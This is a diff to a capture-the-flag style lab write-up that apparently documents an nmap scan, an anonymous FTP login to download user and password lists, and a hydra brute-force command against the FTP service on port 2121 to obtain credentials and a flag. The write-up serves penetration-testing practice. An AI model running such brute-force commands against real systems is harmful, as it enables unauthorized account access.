@@ -1,4 +1,4 @@
-1. Nmap scan result
+### 1. Nmap scan result
 ```
 sudo nmap -sC -sV -A -T4 -Pn 10.129.203.6
 [sudo] password for kali: 
@@ -50,14 +50,18 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 209.74 seconds
 ```
 
-2. I tried port 2121 with an anonymous login and downloaded users.list and passwords.list.
+### 2. I tried port 2121 with an anonymous login and downloaded users.list and passwords.list.
 ![](Images/ftp_1.png)
 
 
-3. We brute forced the FTP service using hydra.
+### 3. We brute forced the FTP service using hydra.
+```sh
+hydra -L users.list -P passwords.list -s 2121 ftp://10.129.203.6
+```
+
 ![](Images/ftp_2.png)
 
-4. Then we login to the ftp using found credentials. Download and submit the flag.
+### 4. Then we login to the ftp using found credentials. Download and submit the flag.
 ![](Images/ftp_3.png)
 
 ![](Images/ftp_4.png)
